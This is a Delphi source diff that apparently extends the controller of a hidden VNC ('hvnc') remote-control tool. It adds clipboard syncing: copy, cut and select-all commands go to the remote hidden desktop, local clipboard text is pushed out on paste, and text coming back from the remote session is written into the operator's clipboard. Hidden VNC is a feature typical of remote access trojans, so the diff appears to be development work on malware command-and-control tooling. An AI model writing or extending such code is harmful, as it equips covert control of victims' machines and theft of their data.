@@ -83,6 +83,9 @@ type
       Button: Integer = -1; KeyCode: Integer = -1;
       InjectFocus: Boolean = False);
 
+    function GetLocalClipboardText: string;
+    procedure SetLocalClipboardText(const Text: string);
+
     procedure DisableChildFocus;
     procedure WMSetFocus(var Message: TWMSetFocus); message WM_SETFOCUS;
 
@@ -458,6 +461,68 @@ end;
 // -------------------------------------------------------------------------
 //  JSON kontrol komutu gönder
 // -------------------------------------------------------------------------
+function TForm10.GetLocalClipboardText: string;
+var
+  Data: THandle;
+  Ptr: Pointer;
+begin
+  Result := '';
+  if OpenClipboard(0) then
+  begin
+    try
+      Data := GetClipboardData(CF_UNICODETEXT);
+      if Data <> 0 then
+      begin
+        Ptr := GlobalLock(Data);
+        if Ptr <> nil then
+        begin
+          try
+            Result := PWideChar(Ptr);
+          finally
+            GlobalUnlock(Data);
+          end;
+        end;
+      end;
+    finally
+      CloseClipboard;
+    end;
+  end;
+end;
+
+procedure TForm10.SetLocalClipboardText(const Text: string);
+var
+  Data: THandle;
+  Ptr: Pointer;
+  Len: Integer;
+begin
+  if OpenClipboard(0) then
+  begin
+    try
+      EmptyClipboard;
+      Len := (Length(Text) + 1) * SizeOf(WideChar);
+      Data := GlobalAlloc(GMEM_MOVEABLE, Len);
+      if Data <> 0 then
+      begin
+        Ptr := GlobalLock(Data);
+        if Ptr <> nil then
+        begin
+          try
+            Move(PWideChar(Text)^, Ptr^, Len);
+          finally
+            GlobalUnlock(Data);
+          end;
+          if SetClipboardData(CF_UNICODETEXT, Data) = 0 then
+            GlobalFree(Data);
+        end
+        else
+          GlobalFree(Data);
+      end;
+    finally
+      CloseClipboard;
+    end;
+  end;
+end;
+
 procedure TForm10.SendControlCommand(const Action: string;
   X, Y, Button, KeyCode: Integer; InjectFocus: Boolean);
 var
@@ -637,6 +702,11 @@ begin
     if Assigned(JSONObj.Values['message']) then
       LogToStatus(JSONObj.Values['message'].Value);
   end
+  else if Action = 'hvnc_clipboard' then
+  begin
+    if Assigned(JSONObj.Values['text']) then
+      SetLocalClipboardText(JSONObj.Values['text'].Value);
+  end
   else if Action = 'hvnc_error' then
   begin
     if Assigned(JSONObj.Values['message']) then
@@ -733,8 +803,50 @@ procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
 var
   OriginalKey: Word;
   CharCode: Word;
+  JSONObj: TJSONObject;
 begin
   if not FPaintBoxActive then Exit;
+
+  if ssCtrl in Shift then
+  begin
+    case Key of
+      Ord('A'):
+        begin
+          SendControlCommand('hvnc_selectall', -1, -1, -1, -1, True);
+          Include(FCharKeyDown, Key);
+          Key := 0;
+          Exit;
+        end;
+      Ord('C'):
+        begin
+          SendControlCommand('hvnc_copy', -1, -1, -1, -1, True);
+          Include(FCharKeyDown, Key);
+          Key := 0;
+          Exit;
+        end;
+      Ord('X'):
+        begin
+          SendControlCommand('hvnc_cut', -1, -1, -1, -1, True);
+          Include(FCharKeyDown, Key);
+          Key := 0;
+          Exit;
+        end;
+      Ord('V'):
+        begin
+          JSONObj := TJSONObject.Create;
+          try
+            JSONObj.AddPair('action', 'hvnc_paste');
+            JSONObj.AddPair('text', GetLocalClipboardText);
+            FSendJSON(FLine, JSONObj);
+          finally
+            JSONObj.Free;
+          end;
+          Include(FCharKeyDown, Key);
+          Key := 0;
+          Exit;
+        end;
+    end;
+  end;
 
   OriginalKey := Key;
 
